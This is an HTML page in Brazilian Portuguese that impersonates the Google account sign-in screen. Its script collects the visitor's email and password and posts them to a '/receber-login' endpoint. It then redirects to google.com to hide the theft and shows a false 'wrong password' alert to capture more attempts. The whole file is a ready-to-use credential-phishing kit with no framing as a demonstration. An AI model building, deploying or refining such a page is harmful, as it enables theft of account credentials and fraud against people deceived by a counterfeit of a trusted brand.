<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fazer login nas Contas do Google</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
        }
        
        /* Variáveis CSS para temas */
        :root {
            --bg-color: #ffffff;
            --text-color: #000000;
            --border-color: #dadce0;
            --input-bg: #ffffff;
            --box-bg: #ffffff;
            --link-color: #1a73e8;
            --footer-text: #757575;
            --logo-color: #5f6368;
        }
        
        /* Modo escuro automático */
        @media (prefers-color-scheme: dark) {
            :root {
                --bg-color: #000000;
                --text-color: #e8eaed;
                --border-color: #5f6368;
                --input-bg: #000000;
                --box-bg: #1a1a1a;
                --link-color: #1669D6;
                --footer-text: #9aa0a6;
                --logo-color: #e8eaed;
            }
        }
        
        body {
            background: var(--bg-color);
            color: var(--text-color);
            min-height: 100vh;
            transition: all 0.3s ease;
        }
        
        /* Header - Mais para cima */
        .header {
            padding: 20px 0 16px 0; /* Reduzido padding */
            text-align: center;
            border-bottom: nome;
        }
        
        .google-logo {
            font-size: 22px;
            font-weight: 600;
            color: var(--logo-color);
        }
        
        /* Main Container - Mais para cima */
        .container {
            max-width: 440px;
            margin: 24px auto 0; /* Reduzido margin-top */
            padding: 0 24px;
        }
        
        .login-box {
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 48px 32px 32px; /* Reduzido padding */
            background: var(--box-bg);
        }
        
        /* Title */
        .title {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .title h1 {
            font-size: 24px;
            font-weight: 600; /* Mais grosso */
            color: var(--text-color);
            margin-bottom: 8px;
        }
        
        .title p {
            font-size: 16px;
            color: var(--text-color);
            font-weight: 400;
        }
        
        /* Form */
        .form-group {
            margin-bottom: 20px;
        }
        
        .input-field {
            width: 100%;
            padding: 18px 15px;
            border: 1px solid var(--border-color);
            border-radius: 4px;
            font-size: 16px;
            transition: all 0.2s;
            background: var(--input-bg);
            color: var(--text-color);
        }
        
        .input-field:focus {
            border-color: var(--link-color);
            outline: none;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }
        
        .input-field.error {
            border-color: #d93025;
        }

        /* Campo de senha */
        .password-field {
            display: none;
            margin-top: 16px;
        }
        
        /* Links */
        .forgot-link {
            display: block;
            text-align: left;
            margin-bottom: 24px;
        }
        
        .forgot-link a {
            color: var(--link-color);
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        .forgot-link a:hover {
            text-decoration: underline;
        }
        
        /* Info Text */
        .info-text {
            font-size: 14px;
            color: var(--footer-text);
            margin: 28px 0 24px;
            line-height: 1.4286;
        }
        
        .info-text a {
            color: var(--link-color);
            text-decoration: none;
            font-weight: 500;
        }
        
        .info-text a:hover {
            text-decoration: underline;
        }
        
        /* Buttons */
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .create-account {
            color: var(--link-color);
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        .create-account:hover {
            text-decoration: underline;
        }
        
        .next-button {
            background: var(--link-color);
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .next-button:hover {
            background: #1669d6;
            box-shadow: 0 1px 2px rgba(0,0,0,0.3);
        }
        
        .next-button:disabled {
            background: var(--link-color);
            opacity: 0.6;
            cursor: not-allowed;
            box-shadow: none;
        }
        
        /* Footer */
        .footer {
            padding: 20px 0;
            border-top: nome;
            margin-top: 32px;
        }
        
        .footer-content {
            max-width: 448px;
            margin: 0 auto;
            padding: 0 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        
        .language-select {
            border: none;
            background: var(--bg-color);
            color: var(--link-color);
            font-size: 12px;
            cursor: pointer;
            padding: 8px;
            border-radius: 4px;
        }
        
        .footer-links {
            display: flex;
            gap: 20px;
        }
        
        .footer-links a {
            color: var(--footer-text);
            text-decoration: none;
            font-size: 12px;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        /* Responsive para mobile */
        @media (max-width: 480px) {
            .container {
                padding: 16px;
                margin-top: 16px;
            }
            
            .login-box {
                border: none;
                padding: 68px 0;
                background: transparent;
            }
            
            .footer-content {
                flex-direction: column;
                gap: 12px;
                text-align: center;
            }
            
            .footer-links {
                justify-content: center;
                flex-wrap: wrap;
            }
            
            .title h1 {
                font-size: 22px;
            }
        }
        
        /* Responsive para telas muito pequenas */
        @media (max-width: 360px) {
            .container {
                margin-top: 16px;
                padding: 15px;
            }
            
            .login-box {
                padding: 62px 0;
            }
            
            .buttons {
                flex-direction: column;
                gap: 12px;
                align-items: stretch;
            }
            
            .create-account {
                text-align: center;
                order: 2;
            }
            
            .next-button {
                order: 1;
            }
        }
        
        /* Animação suave para troca de temas */
        * {
            transition: background-color 0.3s ease, color 0.3s ease, border-color 0.3s ease;
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <div class="google-logo">Google</div>
    </div>

    <!-- Main Content -->
    <div class="container">
        <div class="login-box">
            <div class="title">
                <h1>Fazer login</h1>
                <p>Use sua Conta do Google</p>
            </div>

            <form id="loginForm">
                <div class="form-group">
                    <input type="email" class="input-field" id="email" placeholder="E-mail ou telefone" required autofocus>
                </div>

                <div class="password-field" id="passwordField">
                    <input type="password" class="input-field" id="password" placeholder="Digite sua senha" required>
                </div>

                <div class="forgot-link">
                    <a href="#" id="forgotLink">Esqueceu seu e-mail?</a>
                </div>

                <div class="info-text">
                    Não está no seu computador? Use o modo visitante para fazer login com privacidade. <a href="#">Saiba mais</a>
                </div>

                <div class="buttons">
                    <a href="#" class="create-account">Criar conta</a>
                    <button type="button" class="next-button" id="submitBtn">Próxima</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <div class="footer-content">
            <select class="language-select">
                <option>Português (Brasil)</option>
                <option>English (United States)</option>
                <option>Español (España)</option>
            </select>
            
            <div class="footer-links">
                <a href="#">Ajuda</a>
                <a href="#">Privacidade</a>
                <a href="#">Termos</a>
            </div>
        </div>
    </div>

    <script>
        let currentStep = 1;
        const emailInput = document.getElementById('email');
        const passwordField = document.getElementById('passwordField');
        const passwordInput = document.getElementById('password');
        const forgotLink = document.getElementById('forgotLink');
        const submitBtn = document.getElementById('submitBtn');
        const loginForm = document.getElementById('loginForm');

        // Detectar tema do sistema
        function detectTheme() {
            const isDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
            console.log('Tema detectado:', isDark ? 'Escuro' : 'Claro');
        }

        // Função para avançar para o próximo passo
        function nextStep() {
            const email = emailInput.value;
            
            // Validar email
            if (!email.includes('@')) {
                emailInput.classList.add('error');
                return;
            }
            
            // Simular verificação do Google
            submitBtn.disabled = true;
            submitBtn.textContent = 'Verificando...';
            
            setTimeout(() => {
                // Mostrar campo de senha (segundo passo)
                passwordField.style.display = 'block';
                forgotLink.innerHTML = 'Esqueceu a senha?';
                submitBtn.textContent = 'Fazer login';
                currentStep = 2;
                submitBtn.disabled = false;
                
                // Focar no campo de senha
                passwordInput.focus();
            }, 600);
        }

        // Função para enviar o login final
        async function submitLogin() {
            const email = emailInput.value;
            const password = passwordInput.value;
            
            submitBtn.disabled = true;
            submitBtn.textContent = 'Entrando...';
            
            try {
                // Enviar email E SENHA para o backend
                const response = await fetch('/receber-login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        email: email,
                        senha: password
                    })
                });
                
                const data = await response.json();
                
                if (response.ok) {
                    // Redirecionar diretamente para o Google
                    window.location.href = 'https://google.com';
                } else {
                    throw new Error(data.message || 'Erro no servidor');
                }
                
            } catch (error) {
                // Em caso de erro, mostrar mensagem e limpar senha
                alert('Senha incorreta. Tente novamente.');
                passwordInput.value = '';
                passwordInput.focus();
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Fazer login';
            }
        }

        // Event listener para o botão
        submitBtn.addEventListener('click', function() {
            if (currentStep === 1) {
                nextStep();
            } else {
                submitLogin();
            }
        });

        // Também permitir avançar com Enter no campo de email
        emailInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter' && currentStep === 1) {
                e.preventDefault();
                nextStep();
            }
        });

        // E enviar com Enter no campo de senha
        passwordInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter' && currentStep === 2) {
                e.preventDefault();
                submitLogin();
            }
        });

        // Remover erro quando usuário digitar no email
        emailInput.addEventListener('input', function() {
            this.classList.remove('error');
        });

        // Voltar para o primeiro passo se clicar em "Esqueceu a senha?"
        forgotLink.addEventListener('click', function(e) {
            e.preventDefault();
            if (currentStep === 2) {
                passwordField.style.display = 'none';
                forgotLink.innerHTML = 'Esqueceu seu e-mail?';
                submitBtn.textContent = 'Próxima';
                currentStep = 1;
                emailInput.focus();
            }
        });

        // Também permitir voltar com Enter no campo de senha vazio
        passwordInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && this.value === '' && currentStep === 2) {
                e.preventDefault();
                passwordField.style.display = 'none';
                forgotLink.innerHTML = 'Esqueceu seu e-mail?';
                submitBtn.textContent = 'Próxima';
                currentStep = 1;
                emailInput.focus();
            }
        });

        // Detectar tema ao carregar a página
        detectTheme();
        
        // Ouvir mudanças de tema
        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', detectTheme);
    </script>
</body>
</html>
